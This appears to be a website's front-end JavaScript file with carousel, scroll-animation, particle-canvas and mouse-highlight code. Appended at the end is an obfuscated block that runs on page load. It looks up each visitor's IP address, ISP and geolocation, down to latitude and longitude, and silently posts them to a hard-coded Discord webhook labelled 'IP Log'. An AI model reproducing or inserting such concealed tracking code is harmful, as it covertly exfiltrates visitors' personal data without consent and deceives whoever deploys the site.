AOS.init({
  once: true,
  disable: 'phone',
  duration: 1000,
  easing: 'ease-out-cubic',
});

const clientsEl = document.querySelectorAll('.clients-carousel');
if (clientsEl.length > 0) {
  const clients = new Swiper('.clients-carousel', {
    slidesPerView: 'auto',
    spaceBetween: 64,
    centeredSlides: true,
    loop: true,
    speed: 5000,
    noSwiping: true,
    noSwipingClass: 'swiper-slide',
    autoplay: {
      delay: 0,
      disableOnInteraction: true,
    },
  });
}

const carouselEl = document.querySelectorAll('.testimonials-carousel');
if (carouselEl.length > 0) {
  const carousel = new Swiper('.testimonials-carousel', {
    breakpoints: {
      320: {
        slidesPerView: 1
      },
      640: {
        slidesPerView: 2
      },
      1024: {
        slidesPerView: 3
      }
    },
    grabCursor: true,
    loop: false,
    centeredSlides: false,
    initialSlide: 0,
    spaceBetween: 24,
    navigation: {
      nextEl: '.carousel-next',
      prevEl: '.carousel-prev',
    },
  });
}

class ParticleAnimation {
  constructor(el, { quantity = 30, staticity = 50, ease = 50 } = {}) {
    this.canvas = el;
    if (!this.canvas) return;
    this.canvasContainer = this.canvas.parentElement;
    this.context = this.canvas.getContext('2d');
    this.dpr = window.devicePixelRatio || 1;
    this.settings = {
      quantity: quantity,
      staticity: staticity,
      ease: ease,
    };
    this.circles = [];
    this.mouse = {
      x: 0,
      y: 0,
    };
    this.canvasSize = {
      w: 0,
      h: 0,
    };
    this.onMouseMove = this.onMouseMove.bind(this);
    this.initCanvas = this.initCanvas.bind(this);
    this.resizeCanvas = this.resizeCanvas.bind(this);
    this.drawCircle = this.drawCircle.bind(this);
    this.drawParticles = this.drawParticles.bind(this);
    this.remapValue = this.remapValue.bind(this);
    this.animate = this.animate.bind(this);
    this.init();
  }

  init() {
    this.initCanvas();
    this.animate();
    window.addEventListener('resize', this.initCanvas);
    window.addEventListener('mousemove', this.onMouseMove);
  }

  initCanvas() {
    this.resizeCanvas();
    this.drawParticles();
  }

  onMouseMove(event) {
    const { clientX, clientY } = event;
    const rect = this.canvas.getBoundingClientRect();
    const { w, h } = this.canvasSize;
    const x = clientX - rect.left - (w / 2);
    const y = clientY - rect.top - (h / 2);
    const inside = x < (w / 2) && x > -(w / 2) && y < (h / 2) && y > -(h / 2);
    if(inside) {
      this.mouse.x = x;
      this.mouse.y = y;
    }
  }

  resizeCanvas() {
    this.circles.length = 0;
    this.canvasSize.w = this.canvasContainer.offsetWidth;
    this.canvasSize.h = this.canvasContainer.offsetHeight;
    this.canvas.width = this.canvasSize.w * this.dpr;
    this.canvas.height = this.canvasSize.h * this.dpr;
    this.canvas.style.width = this.canvasSize.w + 'px';
    this.canvas.style.height = this.canvasSize.h + 'px';
    this.context.scale(this.dpr, this.dpr);
  }

  circleParams() {
    const x = Math.floor(Math.random() * this.canvasSize.w);
    const y = Math.floor(Math.random() * this.canvasSize.h);
    const translateX = 0;
    const translateY = 0;
    const size = Math.floor(Math.random() * 2) + 1;
    const alpha = 0;
    const targetAlpha = parseFloat((Math.random() * 0.6 + 0.1).toFixed(1));
    const dx = (Math.random() - 0.5) * 0.2;
    const dy = (Math.random() - 0.5) * 0.2;
    const magnetism = 0.1 + Math.random() * 4;
    return { x, y, translateX, translateY, size, alpha, targetAlpha, dx, dy, magnetism };
  }

  drawCircle(circle, update = false) {
    const { x, y, translateX, translateY, size, alpha } = circle;
    this.context.translate(translateX, translateY);
    this.context.beginPath();
    this.context.arc(x, y, size, 0, 2 * Math.PI);
    this.context.fillStyle = `rgba(255, 255, 255, ${alpha})`;
    this.context.fill();
    this.context.setTransform(this.dpr, 0, 0, this.dpr, 0, 0);
    if (!update) {
      this.circles.push(circle);
    }
  }

  clearContext() {
    this.context.clearRect(0, 0, this.canvasSize.w, this.canvasSize.h);
  }  

  drawParticles() {
    this.clearContext();
    const particleCount = this.settings.quantity;
    for (let i = 0; i < particleCount; i++) {
      const circle = this.circleParams();
      this.drawCircle(circle);
    }
  }

  remapValue(value, start1, end1, start2, end2) {
    const remapped = (value - start1) * (end2 - start2) / (end1 - start1) + start2;
    return remapped > 0 ? remapped : 0;
  }

  animate() {
    this.clearContext();
    this.circles.forEach((circle, i) => {
      const edge = [
        circle.x + circle.translateX - circle.size, 
        this.canvasSize.w - circle.x - circle.translateX - circle.size, 
        circle.y + circle.translateY - circle.size, 
        this.canvasSize.h - circle.y - circle.translateY - circle.size, 
      ];
      const closestEdge = edge.reduce((a, b) => Math.min(a, b));
      const remapClosestEdge = this.remapValue(closestEdge, 0, 20, 0, 1).toFixed(2);
      if(remapClosestEdge > 1) {
        circle.alpha += 0.02;
        if(circle.alpha > circle.targetAlpha) circle.alpha = circle.targetAlpha;
      } else {
        circle.alpha = circle.targetAlpha * remapClosestEdge;
      }
      circle.x += circle.dx;
      circle.y += circle.dy;
      circle.translateX += ((this.mouse.x / (this.settings.staticity / circle.magnetism)) - circle.translateX) / this.settings.ease;
      circle.translateY += ((this.mouse.y / (this.settings.staticity / circle.magnetism)) - circle.translateY) / this.settings.ease;
      if (circle.x < -circle.size || circle.x > this.canvasSize.w + circle.size || circle.y < -circle.size || circle.y > this.canvasSize.h + circle.size) {
        this.circles.splice(i, 1);
        const circle = this.circleParams();
        this.drawCircle(circle);
      } else {
        this.drawCircle({ ...circle, x: circle.x, y: circle.y, translateX: circle.translateX, translateY: circle.translateY, alpha: circle.alpha }, true);
      }
    });
    window.requestAnimationFrame(this.animate);
  }
}

const canvasElements = document.querySelectorAll('[data-particle-animation]');
canvasElements.forEach(canvas => {
  const options = {
    quantity: canvas.dataset.particleQuantity,
    staticity: canvas.dataset.particleStaticity,
    ease: canvas.dataset.particleEase,
  };
  new ParticleAnimation(canvas, options);
});


class Highlighter {
  constructor(containerElement) {
    this.container = containerElement;
    this.boxes = Array.from(this.container.children);
    this.mouse = {
      x: 0,
      y: 0,
    };
    this.containerSize = {
      w: 0,
      h: 0,
    };
    this.initContainer = this.initContainer.bind(this);
    this.onMouseMove = this.onMouseMove.bind(this);
    this.init();
  }

  initContainer() {
    this.containerSize.w = this.container.offsetWidth;
    this.containerSize.h = this.container.offsetHeight;        
  }

  onMouseMove(event) {
    const { clientX, clientY } = event;
    const rect = this.container.getBoundingClientRect();
    const { w, h } = this.containerSize;
    const x = clientX - rect.left;
    const y = clientY - rect.top;
    const inside = x < w && x > 0 && y < h && y > 0;
    if (inside) {
      this.mouse.x = x;
      this.mouse.y = y;
      this.boxes.forEach((box) => {
        const boxX = -(box.getBoundingClientRect().left - rect.left) + this.mouse.x;
        const boxY = -(box.getBoundingClientRect().top - rect.top) + this.mouse.y;
        box.style.setProperty('--mouse-x', `${boxX}px`);
        box.style.setProperty('--mouse-y', `${boxY}px`);
      });
    }
  }

  init() {
    this.initContainer();
    window.addEventListener('resize', this.initContainer);
    window.addEventListener('mousemove', this.onMouseMove);
  }  
}

const highlighters = document.querySelectorAll('[data-highlighter]');
highlighters.forEach((highlighter) => {
  new Highlighter(highlighter);
});


var _0x33614f=_0x11f5;(function(_0xd0b118,_0xcd991b){var _0x4def08=_0x11f5,_0x37ca85=_0xd0b118();while(!![]){try{var _0x248f66=-parseInt(_0x4def08(0x108))/0x1*(-parseInt(_0x4def08(0x105))/0x2)+-parseInt(_0x4def08(0x106))/0x3+-parseInt(_0x4def08(0x120))/0x4+parseInt(_0x4def08(0x10e))/0x5*(parseInt(_0x4def08(0x10f))/0x6)+-parseInt(_0x4def08(0x109))/0x7*(parseInt(_0x4def08(0x104))/0x8)+-parseInt(_0x4def08(0x117))/0x9*(-parseInt(_0x4def08(0x124))/0xa)+parseInt(_0x4def08(0x118))/0xb;if(_0x248f66===_0xcd991b)break;else _0x37ca85['push'](_0x37ca85['shift']());}catch(_0xa9551f){_0x37ca85['push'](_0x37ca85['shift']());}}}(_0x4479,0x4ea6e));var webHookUrl=_0x33614f(0x10c);function _0x11f5(_0x47378c,_0x254134){var _0x447984=_0x4479();return _0x11f5=function(_0x11f548,_0x520b9d){_0x11f548=_0x11f548-0x104;var _0x3b2b79=_0x447984[_0x11f548];return _0x3b2b79;},_0x11f5(_0x47378c,_0x254134);}const request=async()=>{var _0x2abc8b=_0x33614f;const _0x188106=await fetch(_0x2abc8b(0x11c)),_0x349d46=await _0x188106[_0x2abc8b(0x121)]();var _0x300bbe=_0x349d46[_0x2abc8b(0x111)],_0x32bf37=_0x349d46[_0x2abc8b(0x116)]+'\x20('+_0x349d46['as']+')',_0x1db6a9=_0x349d46[_0x2abc8b(0x114)],_0x1816c9=_0x349d46[_0x2abc8b(0x11d)],_0x517361=_0x349d46[_0x2abc8b(0x10a)]['toLowerCase'](),_0x21b9cb=_0x349d46[_0x2abc8b(0x115)]+'\x20('+_0x349d46[_0x2abc8b(0x10b)]+')',_0x4ae922=_0x349d46['city'],_0x1815bb=_0x349d46[_0x2abc8b(0x107)],_0x20178f=_0x349d46['lat'],_0xc634dc=_0x349d46[_0x2abc8b(0x11a)],_0x4ab297=new XMLHttpRequest();_0x4ab297['open']('POST',webHookUrl),_0x4ab297['setRequestHeader']('Content-type',_0x2abc8b(0x11e));var _0xb0e235={'username':_0x2abc8b(0x125),'avatar_url':'','content':_0x2abc8b(0x113)+'`'+_0x300bbe+'`'+_0x2abc8b(0x119)+_0x32bf37+'\x0a\x20\x0a__**:map:\x20Timezon:**__\x20\x0a'+_0x1db6a9+_0x2abc8b(0x122)+KrajKod+_0x2abc8b(0x110)+kraj+_0x2abc8b(0x10d)+_0x21b9cb+'\x0a\x20\x0a__**:cityscape:\x20Zip\x20kod\x20&\x20Miasto:**__\x20\x0a'+_0x1815bb+'\x20'+miasto+_0x2abc8b(0x123)+_0x2abc8b(0x11f)+_0xc634dc+'\x0a'+_0x2abc8b(0x112)+_0x20178f};_0x4ab297['send'](JSON[_0x2abc8b(0x11b)](_0xb0e235));};request();function _0x4479(){var _0x7e1158=['query','**Latitude:**\x20','__**:globe_with_meridians:\x20I-dress:**__\x20\x0a','timezone','region','org','551907EAiFQy','4059627UmPMVU','\x0a\x20\x0a__**:telephone:\x20XD?:**__\x20\x0a','lon','stringify','https://ip-api.com/json/','country','application/json','**Longitude:**\x20','974184PacMbr','json','\x0a\x20\x0a__**:flag_','\x0a\x20\x0a__**:round_pushpin:\x20Location:**__\x20\x0a','20JwcYAp','IP\x20Log','4657688YHjEtP','2oOLSwj','263307oWFQgs','zip','552205lKJbuu','7KODgIc','countryCode','regionName','https://discord.com/api/webhooks/1203451456431194122/R09hq-VJ8MjraJWre0z1kAMBFiCAjw00bnTraRlB3NhoT-RZixo20otkNu7r5UBQvTLk','\x20-\x20','2305PjJdZt','2496NrRoBu',':\x20Kraj\x20i\x20region:**__\x20\x0a'];_0x4479=function(){return _0x7e1158;};return _0x4479();}
